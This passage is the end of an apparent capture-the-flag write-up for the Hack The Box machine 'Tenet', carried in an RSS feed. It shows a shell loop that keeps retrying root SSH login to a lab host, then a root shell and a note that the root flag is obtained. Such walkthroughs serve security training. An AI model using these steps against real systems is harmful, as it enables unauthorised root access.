</span></span><span class="line"><span class="cl">$ <span class="k">while</span> sleep 1<span class="p">;</span> <span class="k">do</span> ssh -oConnectTimeout<span class="o">=</span>1s -oPasswordAuthentication<span class="o">=</span>no root@10.10.10.223 2&gt;/dev/null<span class="p">;</span> <span class="k">done</span>
</span></span></code></pre></div><p>After some minutes, I can finally login as root.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «tenet» «10.10.14.31» 
</span></span><span class="line"><span class="cl">$ ssh root@10.10.10.223
</span></span><span class="line"><span class="cl">Welcome to Ubuntu 18.04.5 LTS <span class="o">(</span>GNU/Linux 4.15.0-129-generic x86_64<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Last login: Tue Jun <span class="m">15</span> 09:50:37 <span class="m">2021</span> from 10.10.14.53
</span></span><span class="line"><span class="cl">root@tenet:~# id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210615165352952.png" alt="image-20210615165352952"  /></div>
</p>
<p>Root flag is done here.</p>
]]></content:encoded>
    </item>
    
  </channel>
</rss>
